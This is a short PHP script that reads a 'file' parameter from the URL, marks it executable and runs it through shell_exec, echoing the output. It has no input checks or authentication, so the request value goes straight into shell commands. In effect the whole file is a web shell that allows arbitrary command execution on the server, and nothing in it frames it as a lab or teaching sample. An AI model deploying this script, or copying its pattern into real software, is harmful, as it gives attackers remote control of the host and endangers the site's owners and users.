<?php
$file = $_GET['file'];
shell_exec("chmod +x $file");
$return = shell_exec($file);

echo $return;
